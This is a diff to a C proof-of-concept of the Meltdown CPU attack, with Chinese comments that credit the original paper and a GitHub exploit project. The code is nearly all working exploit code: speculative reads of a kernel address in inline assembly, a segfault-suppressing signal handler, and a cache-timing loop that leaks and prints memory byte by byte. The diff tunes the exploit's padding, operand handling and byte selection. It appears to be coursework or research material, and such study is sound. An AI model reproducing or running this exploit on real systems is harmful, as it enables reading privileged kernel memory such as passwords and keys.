@@ -29,19 +29,19 @@ extern char stopspeculate[];
 static void speculate(unsigned long addr) {
 	asm volatile (
 		/*塞一些操作保证后面的攻击代码可以乱序执行*/
-		".rept 500\n\t"
-		"add $0x987,%%rax\n\t"
+		".rept 5000\n\t"
+		"add $0x789,%%rax\n\t"
 		".endr\n\t"
-		/*参考论文中的三行核心攻击代码*/
-		"movzx (%[addr]), %%eax\n\t"
+		/*参考论文中的三行核心攻击代码和github项目*/
+		"movzx (%0), %%eax\n\t"
 		"shl $12, %%rax\n\t"
-		"movzx (%[target], %%rax, 1), %%rbx\n"
+		"movzx (%1, %%rax, 1), %%rbx\n"
 		/*抑制段错误手段，发生段错误后使此函数直接返回，详细见后*/
 		"stopspeculate: \n\t"
 		"nop\n\t"
 		:
-	: [target] "r" (target_array),
-		[addr] "r" (addr)
+	: "r" (addr),
+		"r" (target_array)
 		: "rax", "rbx"
 		);
 }
@@ -74,10 +74,9 @@ int attackonebyte(int fd, unsigned long addr)
 				check_array[j]++;
 		}
 	}
-	max_i = -1;
 	for (i = 0; i < ARRAY_SIZE; i++) 
 	{
-		if (check_array[i] > max) 
+		if (check_array[i]&&check_array[i] > max) 
 		{
 			max = check_array[i];
 			max_i = i;
@@ -87,7 +86,7 @@ int attackonebyte(int fd, unsigned long addr)
 }
 /*以下是抑制段错误的函数，参照https://github.com/paboldin/meltdown-exploit.git*/
 /*大致策略是修改sigaction使发生段错误时的操作变为一条nop指令*/
-/*此函数将输入信号断对应服务程序入口改到stopspeculate处，此处为一条空指令并马上返回*/
+/*此函数将输入信号对应服务程序入口改到stopspeculate处，此处为一条空指令并马上返回*/
 void sigsegv(int sig, siginfo_t *siginfo, void *context)
 {
 	ucontext_t *ucontext = context;
@@ -122,22 +121,23 @@ void set_cached_threshold(void)
 }
 int main(int argc, char *argv[])
 {
-	int i, ret, j, max, max_i, k;
+	int i, ret, j, max, max_i;
 	int fd;
 	unsigned long addr;
 	int size = 10;
-	static char record[50];
+	static char record[200];
 	static int attemp[ARRAY_SIZE];
 	sscanf(argv[1], "%lx", &addr);
 	sscanf(argv[2], "%dx", &size);
 	ret = set_signal();
 	memset(target_array, 1, sizeof(target_array));
 	set_cached_threshold();
+	/*攻击目标参考github项目，必须要打开文件*/
 	fd = open("/proc/version", O_RDONLY);
 	for (i = 0; i < size; i++)
 	{
 		memset(attemp, 0, sizeof(attemp));
-		max = -1; max_i = 0;
+		max = 0; max_i = 0; 
 		for (j = 0; j<ATTEMP; j++)
 		{
 			ret = attackonebyte(fd, addr);
@@ -145,13 +145,13 @@ int main(int argc, char *argv[])
 			printf("%c ", isprint(ret) ? ret : ' ');
 #endif
 			attemp[ret]++;
-			for (k = 0; k < ARRAY_SIZE; k++)
+		}
+		for (j = 0; j < ARRAY_SIZE; j++)
+		{
+			if (attemp[j]&&attemp[j] > max)
 			{
-				if (attemp[k] > max&&isprint(k))
-				{
-					max = attemp[k];
-					max_i = k;
-				}
+				max = attemp[j];
+				max_i = j;
 			}
 		}
 		ret = max_i;
@@ -163,7 +163,10 @@ int main(int argc, char *argv[])
 		record[i] = isprint(ret) ? ret : ' ';
 		addr++;
 	}
-	printf("ALL information:\n%s\n", record);
+	printf("ALL information:\n");
+	for(i=0;i<250&&i<size;i++)
+		printf("%c",isprint(record[i]) ? record[i] : ' ');
+	printf("\n");
 	close(fd);
 	return 0;
 }
